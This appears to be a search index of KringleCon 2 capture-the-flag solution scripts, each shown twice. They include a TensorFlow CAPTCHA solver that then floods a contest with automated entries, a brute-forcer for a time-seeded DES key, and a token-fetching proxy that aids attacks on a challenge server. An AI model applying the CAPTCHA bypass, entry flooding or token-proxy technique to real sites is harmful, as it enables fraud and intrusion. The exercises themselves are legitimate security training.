print('-------\\nOur ML Guess:\\n--------\\n{}'.format(final_answer)) print('------\\nServer Response:\\n------\\n{}'.format(json_resp['data'])) sys.exit(1) # Found the CAPTEHA print('CAPTEHA Solved!') # If we get to here, we are successful and can submit a bunch # of entries till we win userinfo = { 'name': 'Krampus Hollyfeld', 'email': 'crahan@example.com', 'age': 180, 'about': \"Cause they're so flippin yummy!\", 'favorites': 'thickmints' } # If we win the once-per minute drawing, it will tell us we were emailed. # Should be no more than 200 times before we win. If more, somethings # wrong. entry_response = '' entry_count = 1 while 'crahan@example.com' not in entry_response and entry_count < 200: print( f'Submitting lots of entries until ' f'we win the contest! Entry #{entry_count}' ) entry_response = s.post( f'{url}api/entry', data=userinfo ).text entry_count += 1 print(entry_response) if __name__ == \"__main__\": main()","title":"capteha_api.py"},{"location":"scripts/capteha_api.py/#capteha_apipy","text":"Purpose : bypass the CAPTHEHA in the Bypassing the Frido Sleigh CAPTEHA challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Bypassing the Frido Sleigh CAPTEHA Challenge.\"\"\" # Image Recognition Using Tensorflow Exmaple. # Code based on example at: # https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/examples/label_image/label_image.py import os import base64 os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3' import tensorflow as tf # noqa tf.logging.set_verbosity(tf.logging.ERROR) import numpy as np # noqa import threading # noqa import queue # noqa import time # noqa import requests # noqa import sys # noqa import json # noqa # sudo apt install python3-pip # sudo python3 -m pip install --upgrade pip # sudo python3 -m pip install --upgrade setuptools # sudo python3 -m pip install --upgrade tensorflow==1.15 def load_labels(label_file): \"\"\"Load labels.\"\"\" label = [] proto_as_ascii_lines = tf.gfile.GFile(label_file).readlines() for l in proto_as_ascii_lines: label.append(l.rstrip()) return label def predict_image( q, sess, graph, image_bytes, img_uuid, labels, input_operation, output_operation): \"\"\"Predict image.\"\"\" image = read_tensor_from_image_bytes(image_bytes) results = sess.run(output_operation.outputs[0], { input_operation.outputs[0]: image }) results = np.squeeze(results) prediction = results.argsort()[-5:][::-1][0] q.put({ 'img_uuid': img_uuid, 'prediction': labels[prediction].title(), 'percent': results[prediction] }) def load_graph(model_file): \"\"\"Load graph.\"\"\" graph = tf.Graph() graph_def = tf.GraphDef() with open(model_file, \"rb\") as f: graph_def.ParseFromString(f.read()) with graph.as_default(): tf.import_graph_def(graph_def) return graph def read_tensor_from_image_bytes( imagebytes, input_height=128, input_width=128, input_mean=0, input_std=255): \"\"\"Read Tensor from image bytes.\"\"\" image_reader = tf.image.decode_png( imagebytes, channels=3, name=\"png_reader\" ) float_caster = tf.cast(image_reader, tf.float32) dims_expander = tf.expand_dims(float_caster, 0) resized = tf.image.resize_bilinear( dims_expander, [input_height, input_width] ) normalized = tf.divide(tf.subtract(resized, [input_mean]), [input_std]) sess = tf.compat.v1.Session() result = sess.run(normalized) return result def main(): \"\"\"Execute.\"\"\" # Loading the Trained Machine Learning Model created from # running retrain.py on the training_images directory graph = load_graph('./tmp/retrain_tmp/output_graph.pb') labels = load_labels(\"./tmp/retrain_tmp/output_labels.txt\") # Load up our session input_operation = graph.get_operation_by_name(\"import/Placeholder\") output_operation = graph.get_operation_by_name(\"import/final_result\") sess = tf.compat.v1.Session(graph=graph) url = \"https://fridosleigh.com/\" # Create session s = requests.Session() # Get CAPTEHA images and types r = s.post(f'{url}api/capteha/request') if (r.json()['request']): images = r.json()['images'] types = [x.strip() for x in r.json()['select_type'].split(',')] types[-1] = types[-1].replace('and ', '') # Can use queues and threading to spead up the processing q = queue.Queue() # Going to iterate over each of our images. for image in images: img_uuid = image['uuid'] img_base64 = image['base64'] print('Processing Image {}'.format(img_uuid)) # We don't want to process too many images at once. 10 threads max while len(threading.enumerate()) > 10: time.sleep(0.0001) # Predict_image function is expecting png image bytes so we read # image as 'rb' to get a bytes object image_bytes = base64.b64decode(img_base64) threading.Thread( target=predict_image, args=( q, sess, graph, image_bytes, img_uuid, labels, input_operation, output_operation ) ).start() print('Waiting For Threads to Finish...') while q.qsize() < len(images): time.sleep(0.001) # Getting a list of all threads returned results prediction_results = [q.get() for x in range(q.qsize())] answers = [] # What are we looking for? print(f'Looking for {types}') # Get the matching images for prediction in prediction_results: if prediction['prediction'] in types: print(f\"{prediction['img_uuid']} is a {prediction['prediction']}.\") answers.append(prediction['img_uuid']) final_answer = ','.join(answers) # Submit CAPTHEHA answers json_resp = json.loads( s.post( f'{url}api/capteha/submit', data={'answer': final_answer} ).text ) # WOMP WOMP if not json_resp['request']: # If it fails just run again. ML might get one wrong occasionally print('FAILED MACHINE LEARNING GUESS') print('-------\\nOur ML Guess:\\n--------\\n{}'.format(final_answer)) print('------\\nServer Response:\\n------\\n{}'.format(json_resp['data'])) sys.exit(1) # Found the CAPTEHA print('CAPTEHA Solved!') # If we get to here, we are successful and can submit a bunch # of entries till we win userinfo = { 'name': 'Krampus Hollyfeld', 'email': 'crahan@example.com', 'age': 180, 'about': \"Cause they're so flippin yummy!\", 'favorites': 'thickmints' } # If we win the once-per minute drawing, it will tell us we were emailed. # Should be no more than 200 times before we win. If more, somethings # wrong. entry_response = '' entry_count = 1 while 'crahan@example.com' not in entry_response and entry_count < 200: print( f'Submitting lots of entries until ' f'we win the contest! Entry #{entry_count}' ) entry_response = s.post( f'{url}api/entry', data=userinfo ).text entry_count += 1 print(entry_response) if __name__ == \"__main__\": main()","title":"capteha_api.py"},{"location":"scripts/decrypt_pdf.py/","text":"decrypt_pdf.py # Purpose : decrypt the PDF in the Recover Cleartext Document challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Recover Cleartext Document Challenge.\"\"\" from Crypto.Cipher import DES seed = 0 def rand(): \"\"\"Generate random value.\"\"\" # 1. get seed value # 2. multiply seed by 214013 # 3. add 2531011 (this is our new seed value) # 4. right shift seed by 16 # 5. bitwise AND with 32767 global seed seed = (214013 * seed + 2531011) val = seed >> 16 return (val & 32767) def generate_key(val): \"\"\"Generate encryption key.\"\"\" global seed seed = val encrypted = [] for _x in range(8): tmp = hex(rand()) if len(str(tmp)) == 6: encrypted.append(str(tmp)[4:]) elif len(str(tmp)) == 5: encrypted.append(str(tmp)[3:]) elif len(str(tmp)) == 4: encrypted.append(str(tmp)[2:]) elif len(str(tmp)) == 3: encrypted.append(f\"0{str(tmp)[-1]}\") return ''.join(encrypted) def main(): \"\"\"Execute.\"\"\" # File names encinfile = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc' pdfoutfile = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf' # Friday, December 6, 2019 7:00:00 PM start = 1575658800 # Loop over 2 hours and generate the key for each for x in range(7200): keyseed = start + x key = generate_key(keyseed) bytekey = bytearray.fromhex(key) # Prep for decrypting DES-CBC cipher = DES.new( bytekey, DES.MODE_CBC, iv=bytearray.fromhex('0000000000000000') ) # Read encrypted file f = open(encinfile, 'rb') encrypted = f.read() # Decrypt using the current key msg = (cipher.iv + cipher.decrypt(encrypted)) # Check if decryption was successful if msg[9:12] == b'PDF': # Yes, we got a PDF! print(f'Pass {x}: {key} decrypts to a PDF!') f = open(pdfoutfile, 'wb') f.write(msg) break else: # Womp womp! On to the next. print(f'Pass {x}: {key} is no bueno!') if __name__ == \"__main__\": main()","title":"decrypt_pdf.py"},{"location":"scripts/decrypt_pdf.py/#decrypt_pdfpy","text":"Purpose : decrypt the PDF in the Recover Cleartext Document challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Recover Cleartext Document Challenge.\"\"\" from Crypto.Cipher import DES seed = 0 def rand(): \"\"\"Generate random value.\"\"\" # 1. get seed value # 2. multiply seed by 214013 # 3. add 2531011 (this is our new seed value) # 4. right shift seed by 16 # 5. bitwise AND with 32767 global seed seed = (214013 * seed + 2531011) val = seed >> 16 return (val & 32767) def generate_key(val): \"\"\"Generate encryption key.\"\"\" global seed seed = val encrypted = [] for _x in range(8): tmp = hex(rand()) if len(str(tmp)) == 6: encrypted.append(str(tmp)[4:]) elif len(str(tmp)) == 5: encrypted.append(str(tmp)[3:]) elif len(str(tmp)) == 4: encrypted.append(str(tmp)[2:]) elif len(str(tmp)) == 3: encrypted.append(f\"0{str(tmp)[-1]}\") return ''.join(encrypted) def main(): \"\"\"Execute.\"\"\" # File names encinfile = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc' pdfoutfile = 'ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf' # Friday, December 6, 2019 7:00:00 PM start = 1575658800 # Loop over 2 hours and generate the key for each for x in range(7200): keyseed = start + x key = generate_key(keyseed) bytekey = bytearray.fromhex(key) # Prep for decrypting DES-CBC cipher = DES.new( bytekey, DES.MODE_CBC, iv=bytearray.fromhex('0000000000000000') ) # Read encrypted file f = open(encinfile, 'rb') encrypted = f.read() # Decrypt using the current key msg = (cipher.iv + cipher.decrypt(encrypted)) # Check if decryption was successful if msg[9:12] == b'PDF': # Yes, we got a PDF! print(f'Pass {x}: {key} decrypts to a PDF!') f = open(pdfoutfile, 'wb') f.write(msg) break else: # Womp womp! On to the next. print(f'Pass {x}: {key} is no bueno!') if __name__ == \"__main__\": main()","title":"decrypt_pdf.py"},{"location":"scripts/find_code.py/","text":"find_code.py # Purpose : generate access codes for the Frosty Keypad hint. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Frosty Keypad Hint.\"\"\" import itertools def is_prime(number): \"\"\"Verify if a number is a prime.\"\"\" return 2 in [number, 2**number % number] def main(): \"\"\"Execute.\"\"\" digit_sets = [ ['1', '1', '3', '7'], ['1', '3', '3', '7'], ['1', '3', '7', '7'] ] primes = [] for digits in digit_sets: for subset in itertools.permutations(digits): val = int(''.join(subset)) if is_prime(val) and val not in primes: primes.append(val) print(f'{val} is a prime number') if __name__ == \"__main__\": main()","title":"find_code.py"},{"location":"scripts/find_code.py/#find_codepy","text":"Purpose : generate access codes for the Frosty Keypad hint. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Frosty Keypad Hint.\"\"\" import itertools def is_prime(number): \"\"\"Verify if a number is a prime.\"\"\" return 2 in [number, 2**number % number] def main(): \"\"\"Execute.\"\"\" digit_sets = [ ['1', '1', '3', '7'], ['1', '3', '3', '7'], ['1', '3', '7', '7'] ] primes = [] for digits in digit_sets: for subset in itertools.permutations(digits): val = int(''.join(subset)) if is_prime(val) and val not in primes: primes.append(val) print(f'{val} is a prime number') if __name__ == \"__main__\": main()","title":"find_code.py"},{"location":"scripts/match_user_agents.py/","text":"match_user_agents.py # Purpose : find additional bad IPs in the Filter Out Poisoned Data Sources challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Filter Out Poisoned Data Sources Challenge.\"\"\" def main(): \"\"\"Execute.\"\"\" file_bad = 'IPs_bad.csv' file_all = 'IPs_all.csv' list_bad = [] list_all = [] # Read the full data log with open(file_all) as fp: line = fp.readline() while line: list_all.append(line.split('\\t')) line = fp.readline() # Read the bad IP data and match on user_agent but only # keep the results if less than 4 matches are found. with open(file_bad) as fp: line = fp.readline() while line: tmp = [] line_bad = line.split('\\t') for line_all in list_all: if line_all[4] == line_bad[4]: tmp.append(line_all[0]) # Only add if less than 4 matches if len(tmp) < 4: list_bad.extend(tmp) # Add the original IP as well list_bad.append(line_bad[0]) line = fp.readline() # Remove duplicates list_bad = list(dict.fromkeys(list_bad)) # Tadaaaaa! print(f'Found {len(list_bad)} IPs: {\",\".join(list_bad)}') if __name__ == \"__main__\": main()","title":"match_user_agents.py"},{"location":"scripts/match_user_agents.py/#match_user_agentspy","text":"Purpose : find additional bad IPs in the Filter Out Poisoned Data Sources challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Filter Out Poisoned Data Sources Challenge.\"\"\" def main(): \"\"\"Execute.\"\"\" file_bad = 'IPs_bad.csv' file_all = 'IPs_all.csv' list_bad = [] list_all = [] # Read the full data log with open(file_all) as fp: line = fp.readline() while line: list_all.append(line.split('\\t')) line = fp.readline() # Read the bad IP data and match on user_agent but only # keep the results if less than 4 matches are found. with open(file_bad) as fp: line = fp.readline() while line: tmp = [] line_bad = line.split('\\t') for line_all in list_all: if line_all[4] == line_bad[4]: tmp.append(line_all[0]) # Only add if less than 4 matches if len(tmp) < 4: list_bad.extend(tmp) # Add the original IP as well list_bad.append(line_bad[0]) line = fp.readline() # Remove duplicates list_bad = list(dict.fromkeys(list_bad)) # Tadaaaaa! print(f'Found {len(list_bad)} IPs: {\",\".join(list_bad)}') if __name__ == \"__main__\": main()","title":"match_user_agents.py"},{"location":"scripts/token_proxy.py/","text":"token_proxy.py # Purpose : translate tokens for the Retrieve the Scraps of Paper from Server challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Retrieve Scraps of Paper from Server Challenge.\"\"\" import requests from flask import Flask, Response app = Flask(__name__) @app.route(\"/\") def token(): \"\"\"Return a token.\"\"\" url = 'https://studentportal.elfu.org/validator.php' token = requests.Session().get(url).text # Put the token in the body, input tag, and header. resp = Response( f'Token:{token}\\n' '<form>\\n' f' <input type=\"hidden\" id=\"token\" name=\"token\" value=\"{token}\"/>\\n' '</form>\\n' ) resp.headers['token'] = token return resp if __name__ == '__main__': app.run(host='0.0.0.0')","title":"token_proxy.py"},{"location":"scripts/token_proxy.py/#token_proxypy","text":"Purpose : translate tokens for the Retrieve the Scraps of Paper from Server challenge. #!/usr/bin/env python3 \"\"\"KringleCon 2 - Retrieve Scraps of Paper from Server Challenge.\"\"\" import requests from flask import Flask, Response app = Flask(__name__) @app.route(\"/\") def token(): \"\"\"Return a token.\"\"\" url = 'https://studentportal.elfu.org/validator.php' token = requests.Session().get(url).text # Put the token in the body, input tag, and header. resp = Response( f'Token:{token}\\n' '<form>\\n' f' <input type=\"hidden\" id=\"token\" name=\"token\" value=\"{token}\"/>\\n' '</form>\\n' ) resp.headers['token'] = token return resp if __name__ == '__main__': app.run(host='0.0.0.0')","title":"token_proxy.py"}]}